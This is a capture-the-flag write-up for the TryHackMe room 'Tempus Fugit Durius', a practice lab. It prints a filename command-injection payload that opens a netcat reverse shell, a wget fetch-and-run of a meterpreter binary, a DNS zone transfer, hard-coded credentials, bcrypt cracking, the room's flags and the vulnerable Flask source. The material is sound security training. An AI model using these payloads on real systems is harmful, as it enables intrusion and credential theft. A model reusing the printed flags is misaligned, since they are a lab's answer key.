# Tempus Fugit Durius

The latin word Durius means "harder"

[Tempus Fugit Durius](https://tryhackme.com/room/tempusfugitdurius)

## Topic's

- Network Enumeration
- Code Injection
- Stored Passwords & Keys
- Exploitation FTP
- DNS Enumeration
- SQL Enumeration
- Brute Forcing (Hash)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Harder

Tempus Fugit is a Latin phrase that roughly translated as “time flies”.

Durius is also latin and means "harder".

This is a remake of Tempus Fugit 1. A bit harder and different from the first one.

It is an intermediate/hard, real life box.

```
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ sudo nmap -A -sS -sC -sV -O 10.10.71.213
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 20:14 CEST
Nmap scan report for 10.10.71.213
Host is up (0.034s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)
|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)
|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)
|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)
80/tcp  open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Tempus Fugit Durius
|_http-trane-info: Problem with XML parsing of /evox/about
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35514/udp6  status
|   100024  1          56863/tcp   status
|   100024  1          59541/tcp6  status
|_  100024  1          59736/udp   status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=36796%PV=Y%DS=2%DC=T%G=Y%TM=5F8F29
OS:14%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   39.04 ms 10.8.0.1
2   39.26 ms 10.10.71.213

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.91 seconds
```

0a.08.6a.de (0x0a086ade)

`;nc 0x0a086ade 9001 -e sh`

```
POST /upload HTTP/1.1
Host: 10.10.71.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.71.213/upload
Content-Type: multipart/form-data; boundary=---------------------------18037086671511817744631445894
Content-Length: 335
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------18037086671511817744631445894
Content-Disposition: form-data; name="file"; filename="a.txt;nc 0x0a086ade 9001 -e sh"
Content-Type: text/plain


-----------------------------18037086671511817744631445894
Content-Disposition: form-data; name="my-form"

Upload !
-----------------------------18037086671511817744631445894--

```

```
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.71.213] 41326
id
uid=1000(www) gid=1000(www) groups=1000(www)
```

```
bash-4.4$ cd /
bash-4.4$ ls
app                        root
bin                        run
dev                        sbin
entrypoint.sh              srv
etc                        start.sh
home                       sys
lib                        tmp
media                      usr
mnt                        uwsgi-nginx-entrypoint.sh
proc                       var
bash-4.4$ cat start.sh
```

```sh
#! /usr/bin/env sh
set -e

# If there's a prestart.sh script in the /app directory, run it before starting
PRE_START_PATH=/app/prestart.sh
echo "Checking for script in $PRE_START_PATH"
if [ -f $PRE_START_PATH ] ; then
    echo "Running script $PRE_START_PATH"
    . $PRE_START_PATH
else
    echo "There is no script $PRE_START_PATH"
fi

# Start Supervisor, with Nginx and uWSGI
exec /usr/bin/supervisord
```

```
bash-4.4$ ls /app/
__pycache__      main.py          supervisord.pid  uwsgi.ini
debug            prestart.sh      templates
index.html       static           upload
bash-4.4$ cat /app/main.py
```

```py
import os
import urllib.request
from flask import Flask, flash, request, redirect, render_template
from ftplib import FTP
import subprocess

UPLOAD_FOLDER = 'upload'
ALLOWED_EXTENSIONS = {'txt', 'rtf'}

app = Flask(__name__)
app.secret_key = "mofosecret"
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024



@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
      cmd = 'fortune'
      result = subprocess.check_output(cmd, shell=True)
      return "<h1>400 - Sorry. I didn't find what you where looking for.</h1> <h2>Maybe this will cheer you up:</h2><h3>"+result.decode("utf-8")+"</h3>"
@app.errorhandler(500)
def internal_error(error):
    return "<h1>500?! - What are you trying to do here?!</h1>"

@app.route('/')

def home():
        return render_template('index.html')


@app.route('/upload')

def upload_form():
        try:
            return render_template('my-form.html')
        except Exception as e:
            return render_template("500.html", error = str(e))


def allowed_file(filename):
           check = filename.rsplit('.', 1)[1].lower()
           check = check[:3] in ALLOWED_EXTENSIONS
           return check

def filtering(filename):
           filtered = filename.replace("#","")
           return filtered


@app.route('/upload', methods=['POST'])
def upload_file():
        if request.method == 'POST':

                if 'file' not in request.files:
                        flash('No file part')
                        return redirect(request.url)
                file = request.files['file']
                if file.filename == '':
                        flash('No file selected for uploading')
                        return redirect(request.url)
                if len(file.filename) > 30:
                        flash('That filename was way too long!')
                        return redirect(request.url)

                if file.filename and allowed_file(file.filename):
                        filename = file.filename
                        filename = filtering(filename)
                        file.save(os.path.join(UPLOAD_FOLDER, filename))
                        cmd="cat "+UPLOAD_FOLDER+"/"+filename
                        result = subprocess.check_output(cmd, shell=True)
                        flash(result.decode("utf-8"))
                        flash('File successfully uploaded')

                        try:
                           ftp = FTP('ftp.mofo.pwn')
                           ftp.login('someuser', '04653cr37Passw0rdK06')
                           with open(UPLOAD_FOLDER+"/"+filename, 'rb') as f:
                              ftp.storlines('STOR %s' % filename, f)
                              ftp.quit()
                              os.remove(UPLOAD_FOLDER+"/"+filename)
                        except:
                           flash("Cannot connect to FTP-server")
                        return redirect('/upload')

                else:
                        flash('Allowed file types are txt and rtf')
                        return redirect(request.url)








if __name__ == "__main__":
    app.run()
```

```py
ftp = FTP('ftp.mofo.pwn')
ftp.login('someuser', '04653cr37Passw0rdK06')
```

```
bash-4.4$ cat /app/prestart.sh
```

```sh
#! /usr/bin/env sh

echo "Running inside /app/prestart.sh, you could add migrations to this file, e.g.:"

echo "
#! /usr/bin/env bash

# Let the DB start
sleep 10;
# Run migrations
alembic upgrade head
"
```

```
python3 ftp.py
-rw-------    1 ftp      ftp            24 Apr 22 14:42 creds.txt
ls
creds.txt
ftp.py
meter
shell.elf
uwsgi.sock
cat creds.txt
admin:BAraTuwwWzx3gG
```

`admin:BAraTuwwWzx3gG`

```
bash-4.4$ dig axfr mofo.pwn @192.168.150.100

; <<>> DiG 9.11.8 <<>> axfr mofo.pwn @192.168.150.100
;; global options: +cmd
mofo.pwn.               14400   IN      SOA     ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
mofo.pwn.               14400   IN      TXT     "v=spf1 ip4:176.23.46.22 a mx ~all"
mofo.pwn.               14400   IN      NS      ns1.mofo.pwn.
durius.mofo.pwn.        14400   IN      A       192.168.150.1
ftp.mofo.pwn.           14400   IN      CNAME   punk.mofo.pwn.
gary.mofo.pwn.          14400   IN      A       192.168.150.15
geek.mofo.pwn.          14400   IN      A       192.168.150.14
kfc.mofo.pwn.           14400   IN      A       192.168.150.17
leet.mofo.pwn.          14400   IN      A       192.168.150.13
mail.mofo.pwn.          14400   IN      TXT     "v=spf1 a -all"
mail.mofo.pwn.          14400   IN      A       192.168.150.11
milo.mofo.pwn.          14400   IN      A       192.168.150.16
newcms.mofo.pwn.        14400   IN      CNAME   durius.mofo.pwn.
ns1.mofo.pwn.           14400   IN      A       192.168.150.100
punk.mofo.pwn.          14400   IN      A       192.168.150.12
sid.mofo.pwn.           14400   IN      A       192.168.150.10
www.mofo.pwn.           14400   IN      CNAME   sid.mofo.pwn.
mofo.pwn.               14400   IN      SOA     ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
;; Query time: 0 msec
;; SERVER: 192.168.150.100#53(192.168.150.100)
;; WHEN: Sun Oct 25 11:09:23 UTC 2020
;; XFR size: 18 records (messages 1, bytes 467)
```

```
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ msfconsole -q
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set LPORT 9002
LPORT => 9002
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.106.222:9002
```

```
bash-4.4$ cd /tmp
bash-4.4$ pwd
/tmp
bash-4.4$ wget 10.8.106.222/shell.elf
Connecting to 10.8.106.222 (10.8.106.222:80)
shell.elf            100% |*******************************|  1012k  0:00:00 ETA
bash-4.4$ chmod +x shell.elf
bash-4.4$ ./shell.elf
```

```
meterpreter > clear
[-] Unknown command: clear.
meterpreter > portfwd add -l 8888 -p 80 -r 192.168.150.10
[*] Local TCP relay created: :8888 <-> 192.168.150.10:80
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.150.1
[*] Local TCP relay created: :8080 <-> 192.168.150.1:80
meterpreter >
```

[http://localhost:8888/](http://localhost:8888/)

[http://localhost:8080/](http://localhost:8080/)

`admin:BAraTuwwWzx3gG`

```
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ sudo nano /etc/hosts

127.0.0.1       newcms.mofo.pwn
```

[http://newcms.mofo.pwn:8080/admin/](http://newcms.mofo.pwn:8080/admin/)

[http://newcms.mofo.pwn:8080/admin/settings/theme/default/492dac064306b8aef8129a999b6aa730?t=5d90c5ad257c](http://newcms.mofo.pwn:8080/admin/settings/theme/default/492dac064306b8aef8129a999b6aa730?t=5d90c5ad257c)

```
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ nc -lnvp 9003
Listening on 0.0.0.0 9003
Connection received on 10.10.71.213 58106
Linux Durius 3.16.0-6-amd64 #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) x86_64 GNU/Linux
 06:32:05 up 38 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Durius:/$ ^Z
[1]+  Stopped                 nc -lnvp 9003
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ stty raw -echo
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ nc -lnvp 9003

www-data@Durius:/$ export TERM=xterm
www-data@Durius:/$
```

```
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ sqlite3 database.sdb
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
blog                    login_attempts          remember_me
blog_tags               modules                 settings
blog_tags_relationship  navs                    snippets
galleries               navs_items              users
galleries_items         pages
sqlite> select * from users;
1|admin|Hugh Gant|My name is Hugh Gant. Da boss|$2y$10$HvIMAjTHGJXVeVyua.SxWum6ASmouY2svALXkZludVLPzvMbAAely|avatar5ea1f73cdf267.png|admin@mofo.pwn|admin|all
2|Ben|Clower||$2y$10$KSWWopGZdJhqP3iq8juuauMyNZjA8S8X/49lr7XntZKXsuWRUgaFC|avatar5ea05e10750a9.png|benclower@mofo.pwn|admin|all
sqlite>
```

```
kali@kali:~/CTFs/tryhackme/Tempus Fugit Durius$ john ben.hash -w=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
divisionminuscula (?)
1g 0:00:35:05 DONE (2020-10-25 13:18) 0.000474g/s 76.25p/s 76.25c/s 76.25C/s dkdkdk..diva89
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`divisionminuscula`

```
www-data@Durius:/home$ su benclower
Password:
benclower@Durius:/home$ ls
benclower  me
benclower@Durius:/home$ cd
benclower@Durius:~$ ls
flag1.txt
benclower@Durius:~$ cat flag1.txt
THM{Nice_Work_Got_Ben_Clower}
```

```
Apr 22 15:00:53 Durius sshd[7950]: Accepted password for me from 192.168.66.1 port 64299 ssh2
Apr 22 15:01:08 Durius passwd[7979]: pam_unix(passwd:chauthtok): password changed for bendover
Apr 22 16:55:13 Durius sshd[1526]: Accepted password for me from 192.168.66.1 port 51165 ssh2
Apr 22 17:28:25 Durius sshd[1856]: Accepted password for me from 192.168.66.1 port 52087 ssh2
Apr 22 17:30:24 Durius passwd[1884]: pam_unix(passwd:chauthtok): password changed for root
Apr 22 17:31:29 Durius sshd[1891]: Failed password for invalid user sTertXssd65rfd_sdf from 192.168.66.1 port 52129 ssh2
Apr 22 17:31:29 Durius sshd[1891]: Failed password for invalid user sTertXssd65rfd_sdf from 192.168.66.1 port 52129 ssh2
Apr 23 01:12:27 Durius sshd[2662]: Accepted password for me from 192.168.66.1 port 62962 ssh2
Apr 23 02:45:54 Durius sshd[15237]: Accepted password for mofo from 192.168.66.1 port 65204 ssh2
Apr 23 02:51:26 Durius sshd[15259]: Accepted password for mofo from 192.168.66.1 port 65385 ssh2
Apr 23 02:55:08 Durius sshd[1256]: Accepted password for mofo from 192.168.66.1 port 65457 ssh2
Apr 23 11:33:11 Durius sshd[11809]: Accepted password for mofo from 192.168.66.1 port 60235 ssh2
Apr 23 15:11:31 Durius sshd[1443]: Accepted password for me from 192.168.66.1 port 51085 ssh2
Apr 23 15:46:35 Durius sshd[1370]: Accepted password for me from 192.168.66.1 port 52654 ssh2
$
```

```
$ su
Password:
root@Durius:/var/log# cd /root/
root@Durius:~# ls
flag2.txt
root@Durius:~# cat flag2.txt
THM{Great_work!_You_Rooted_TempusFugitDurius!}
```

1. What is flag 1?

`THM{Nice_Work_Got_Ben_Clower}`

2. What is flag 2?

`THM{Great_work!_You_Rooted_TempusFugitDurius!}`
